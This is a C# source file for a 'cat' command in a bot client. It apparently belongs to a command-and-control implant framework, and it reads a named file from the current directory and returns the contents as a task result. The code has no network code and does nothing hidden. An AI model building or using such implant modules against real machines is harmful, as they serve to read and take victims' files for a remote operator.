using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System.IO;

namespace pattaya_project_client.Commands.Implements
{
    public class Cat : BotCommand
    {
        public override string TaskName => "cat";

        public override BotTaskResult RunTask(BotTask task)
        {
            var arguments = task.Arguments.Split(' ');

            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
            {

                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = "No file provided"
                };
            }


            var file = arguments[0];

            string currentDir = Directory.GetCurrentDirectory();

            string fullPath = Path.Combine(currentDir, file);

            if (!File.Exists(fullPath))
            {


                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = $"{file} not found"
                };
            }

            string result;

            try
            {
                string content = File.ReadAllText(fullPath); 
                result = content;
            }
            catch (IOException ex)
            {
                result = $"Error reading file: {ex.Message}";
            }

            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = result,
            };


        }
    }
}
